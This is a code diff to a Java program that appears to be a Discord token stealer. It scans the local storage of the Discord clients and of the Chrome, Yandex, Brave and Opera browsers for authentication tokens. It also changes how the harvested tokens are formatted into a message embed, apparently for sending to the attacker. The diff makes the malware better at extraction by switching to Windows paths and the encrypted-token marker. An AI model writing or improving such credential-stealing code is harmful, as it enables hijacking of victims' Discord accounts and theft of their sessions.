@@ -138,12 +138,21 @@ public final class Main {
             // Wenn die Tokens diese Länge überschreiten, müssen wir sie aufteilen.
             // Jeder Token ist ca. 60 Zeichen lang, plus Formatierung.
             // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
-            StringBuilder sb = new StringBuilder("```");
-            int currentLength = 3; // Länge von "```"
+            StringBuilder sb = new StringBuilder();
+            sb.append("**Found ").append(tokens.size()).append(" token(s):**\n\n");
+            int maxLength = 3500; // Leave room for formatting
+            int currentLength = sb.length();
+            
             for (int i = 0; i < tokens.size(); i++) {
                 String token = tokens.get(i);
-                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge, falls er extrem lang ist
-                sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
+                String displayToken = "**Token " + (i + 1) + ":**\n```" + safeString(token, 500) + "```\n";
+                
+                if (currentLength + displayToken.length() > maxLength) {
+                    sb.append("*...and ").append(tokens.size() - i).append(" more*");
+                    break;
+                }
+                sb.append(displayToken);
+                currentLength += displayToken.length();
             }
             tokenEmbed.setDescription(sb.toString());
         }
@@ -154,36 +163,44 @@ public final class Main {
     public static ArrayList<String> getTokens() {
         ArrayList<String> temp = new ArrayList<>();
         ArrayList<File> paths = new ArrayList<>();
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/"));
-        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));
+        // Updated path format using Windows environment variable
+        String userHome = System.getProperty("user.home");
+        paths.add(new File(userHome + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"));
+        paths.add(new File(userHome + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"));
 
+        // Correct Discord token identifier pattern from reference implementation
+        String tokenPattern = "dQw4w9WgXcQ:";
+        
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
             }
             File[] filesList = file.listFiles();
             if (filesList == null) continue;
-            for (File pathname : filesList) { // Changed 'file' to 'pathname' for clarity
+            for (File pathname : filesList) {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
-                        int index;
-                        while ((index = strLine.indexOf("oken")) != -1 && strLine.length() > index + "oken".length() + 1) { // Ensure there's enough string left
+                        // Use the correct Discord token identifier pattern
+                        if (strLine.contains(tokenPattern)) {
                             try {
-                                strLine = strLine.substring(index + "oken".length() + 1);
-                                String token = strLine.split("\"")[1];
-                                if (!temp.contains(token) && token.split("\\.").length >= 2) {
-                                    temp.add(token);
+                                // Extract token after the pattern
+                                String[] parts = strLine.split(tokenPattern);
+                                if (parts.length > 1) {
+                                    String tokenPart = parts[1].split("\"")[0];
+                                    if (!temp.contains(tokenPart) && !tokenPart.isEmpty()) {
+                                        temp.add(tokenPart);
+                                    }
                                 }
                             } catch (Exception ignored) {
                                 // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
                             }
-                        } // while index
+                        }
                     }
                 } catch (Exception ignored) {
                     // Ignoriere Fehler beim Lesen einer Datei und setze fort
